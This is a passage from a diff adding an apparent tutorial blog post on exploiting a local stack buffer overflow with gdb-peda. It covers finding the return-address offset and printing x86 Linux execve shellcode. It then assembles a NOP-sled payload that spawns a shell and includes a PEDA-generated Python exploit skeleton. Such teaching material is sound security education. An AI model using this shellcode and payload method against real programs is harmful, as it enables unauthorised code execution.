+  'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+  gdb-peda$ pset arg 'cyclic_pattern(100)'
+  gdb-peda$ pshow arg 
+  arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+  gdb-peda$ run
+   [----------------------------------registers-----------------------------------]
+  EAX: 0x0 
+  EBX: 0xb7fd1ff4 --&amp;gt; 0x1a0d7c 
+  ECX: 0xffffffff 
+  EDX: 0xb7fd38b8 --&amp;gt; 0x0 
+  ESI: 0x0 
+  EDI: 0x0 
+  EBP: 0x65414149 ('IAAe')
+  ESP: 0xbffff650 (&quot;AJAAfAA5AAKAAgAA6AAL&quot;)
+  EIP: 0x41344141 ('AA4A')
+  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+  [-------------------------------------code-------------------------------------]
+  Invalid $PC address: 0x41344141
+  [------------------------------------stack-------------------------------------]
+  0000| 0xbffff650 (&quot;AJAAfAA5AAKAAgAA6AAL&quot;)
+  0004| 0xbffff654 (&quot;fAA5AAKAAgAA6AAL&quot;)
+  0008| 0xbffff658 (&quot;AAKAAgAA6AAL&quot;)
+  0012| 0xbffff65c (&quot;AgAA6AAL&quot;)
+  0016| 0xbffff660 (&quot;6AAL&quot;)
+  0020| 0xbffff664 --&amp;gt; 0xbffff600 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+  0024| 0xbffff668 --&amp;gt; 0xbffff6f0 --&amp;gt; 0xbffff893 (&quot;LC_PAPER=en_GB.UTF-8&quot;)
+  0028| 0xbffff66c --&amp;gt; 0x0 
+  [------------------------------------------------------------------------------]
+  Legend: code, data, rodata, value
+  Stopped reason: SIGSEGV
+  0x41344141 in ?? ()
+  gdb-peda$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see a buffer of 100 chars crashed the program, lets use peda to find
+out what exact offset in the buffer caused the crash&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gdb-peda$ pattern offset 0x41344141
+  1093943617 found at offset: 76
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Whay choose that hex value? well that was the walue of EIP when the program
+crashed. We had overflowed the return address and the program tried to jump to
+that address, we simply told peda to seacch for that byte pattern in the cyclic
+pattern it had created for us ealier. PEDA told us that there are 76 characters
+in the buffer before the return address gets overflowed.&lt;/p&gt;
+
+&lt;p&gt;Next step is to get us some shellcode and store it in a variable&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gdb-peda$ shellcode generate 
+  Available shellcodes:
+      x86/bsd bindport
+      x86/bsd connect
+      x86/bsd exec
+      x86/linux bindport
+      x86/linux connect
+      x86/linux exec
+
+  gdb-peda$ shellcode generate x86/linux exec
+  # x86/linux/exec: 24 bytes
+  shellcode = (
+      &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31&quot;
+      &quot;\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;
+  )
+  gdb-peda$ python 
+  &amp;gt;shellcode = (
+  &amp;gt;    &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31&quot;
+  &amp;gt;    &quot;\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;
+  &amp;gt;)
+  &amp;gt;end
+  gdb-peda$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;So it turns out peda also has a library of shellcode as well as an interface to
+shelstorm.org. What we have done here is to get peda to display the shellcode
+for an execve shell (see my shellcode article). We then use peda’s python
+command to assign this to a python variable.&lt;/p&gt;
+
+&lt;p&gt;Lets craft our payload&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gdb-peda$ pset arg '&quot;A&quot; * 76 + &quot;BBBB&quot; + &quot;\x90&quot;*500 + shellcode'
+  gdb-peda$ r
+   [----------------------------------registers-----------------------------------]
+  EAX: 0x0 
+  EBX: 0xb7fd1ff4 --&amp;gt; 0x1a0d7c 
+  ECX: 0xffffffff 
+  EDX: 0xb7fd38b8 --&amp;gt; 0x0 
+  ESI: 0x0 
+  EDI: 0x0 
+  EBP: 0x41414141 ('AAAA')
+  ESP: 0xbffff450 --&amp;gt; 0x90909090 
+  EIP: 0x42424242 ('BBBB')
+  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+  [-------------------------------------code-------------------------------------]
+  Invalid $PC address: 0x42424242
+  [------------------------------------stack-------------------------------------]
+  0000| 0xbffff450 --&amp;gt; 0x90909090 
+  0004| 0xbffff454 --&amp;gt; 0x90909090 
+  0008| 0xbffff458 --&amp;gt; 0x90909090 
+  0012| 0xbffff45c --&amp;gt; 0x90909090 
+  0016| 0xbffff460 --&amp;gt; 0x90909090 
+  0020| 0xbffff464 --&amp;gt; 0x90909090 
+  0024| 0xbffff468 --&amp;gt; 0x90909090 
+  0028| 0xbffff46c --&amp;gt; 0x90909090 
+  [------------------------------------------------------------------------------]
+  Legend: code, data, rodata, value
+  Stopped reason: SIGSEGV
+  0x42424242 in ?? ()
+  gdb-peda$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see the program crashed again bit this time EIP points to out B’s
+(0x42424242). Let me explain the payload string. PEDA allow you to use python
+expressions to set the argument that will be passed to the program when gdn runs
+it so the payload is broken down as follows&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;“A” * 76     - 76 A’s (which we found using pattern offset)&lt;/li&gt;
+  &lt;li&gt;“BBBB”       - This will end up being the return address to our shellcode&lt;/li&gt;
+  &lt;li&gt;“0x90” * 500 - 500 NOPS which gives us a margin of error with the return
+               address&lt;/li&gt;
+  &lt;li&gt;shellcode    - Our shellcode string we stored in the variable earlier&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Right we currently have one thing left to do, find the address to jump to! When
+the program crashed peda displayed a nice view of the stack and it seems to be
+filled with our NOPS so we’ll pick and address near the bottom and insert it
+into our payload&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gdb-peda$ pset arg '&quot;A&quot; * 76 + &quot;\x6c\xf4\xff\xbf&quot; + &quot;\x90&quot;*500 + shellcode'
+  gdb-peda$ r
+  AAAAAAAAAAAAAAAA........
+  process 8331 is executing new program: /bin/dash
+  $ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Hey presto we have a shell! Why is the address backwards? little endian my
+friends! go and google it. One point to note is that peda provides a function
+for you to do this so you arg could become&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gdb-peda$ pset arg '&quot;A&quot; * 76 + int2hexstr(0xbffff46c) + &quot;\x90&quot;*500 + shellcode'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h1 id=&quot;weaponize-it&quot;&gt;Weaponize it!&lt;/h1&gt;
+&lt;p&gt;Lets use peda to weaponize this thing! PEDA has some nifty commands to write
+exploit skeletons&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gdb-peda$ skeleton argv exploit.py
+  Writing skeleton code to file &quot;exploit.py&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;This has generated the following code&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Template for local argv exploit code, generated by PEDA&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;resource&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s target_program&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pattern.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;nops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int2hexstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intsize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;l&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;L&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;i2hs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int2hexstr&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PAYLOAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# put your payload here&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list2hexstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PEDA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_CORE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We have to modify this to include our payload from the gdb session, the output
+looks like the following&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Template for local argv exploit code, generated by PEDA&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;resource&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s target_program&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pattern.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
